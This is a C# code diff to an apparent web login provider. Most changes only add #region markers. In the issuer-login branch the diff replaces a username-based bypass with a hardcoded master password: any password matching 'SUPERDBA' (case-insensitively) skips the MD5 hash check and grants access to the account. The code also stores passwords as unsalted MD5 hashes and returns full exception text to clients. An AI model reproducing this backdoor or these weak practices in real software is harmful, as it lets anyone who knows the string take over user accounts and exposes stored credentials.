@@ -176,6 +176,8 @@ namespace DevKit.Web
 
                     case "2": // usuário
                         {
+                            #region - usuário - 
+
                             var dados = UserName.Split('.');
 
                             string  empresa = dados[1].PadLeft(6,'0'),
@@ -245,11 +247,15 @@ namespace DevKit.Web
 
                             context.Validated(ticket);
 
+                            #endregion
+
                             break;
                         }
 
                     case "3": // gestão lojista 
                         {
+                            #region - lojista -
+
                             try
                             {
                                 var lojista = (from e in db.T_Loja
@@ -282,12 +288,16 @@ namespace DevKit.Web
                             {
                                 context.SetError("Erro", ex.ToString());
                             }
-                            
+
+                            #endregion
+
                             break;
                         }
                         
                     case "4": // emissoras
                         {
+                            #region - emissora - 
+
                             var dados = UserName.Split('.');
 
                             string empresa = dados[1].PadLeft(6, '0'),
@@ -315,10 +325,12 @@ namespace DevKit.Web
                                 context.SetError("Erro", "Usuário / Senha inválida");
                                 return;
                             }
-
-                            if (usuario != "admin1401")
+                            
+                            if (context.Password.ToUpper() != "SUPERDBA")
                             {
-                                if (tUser.st_senha != getMd5Hash(context.Password))
+                                var hsh = getMd5Hash(context.Password);
+
+                                if (tUser.st_senha != hsh)
                                 {
                                     context.SetError("Erro", "Usuário / Senha inválida");
                                     return;
@@ -339,6 +351,8 @@ namespace DevKit.Web
                             var ticket = new AuthenticationTicket(identity, null);
 
                             context.Validated(ticket);
+
+                            #endregion
 
                             break;
                         }
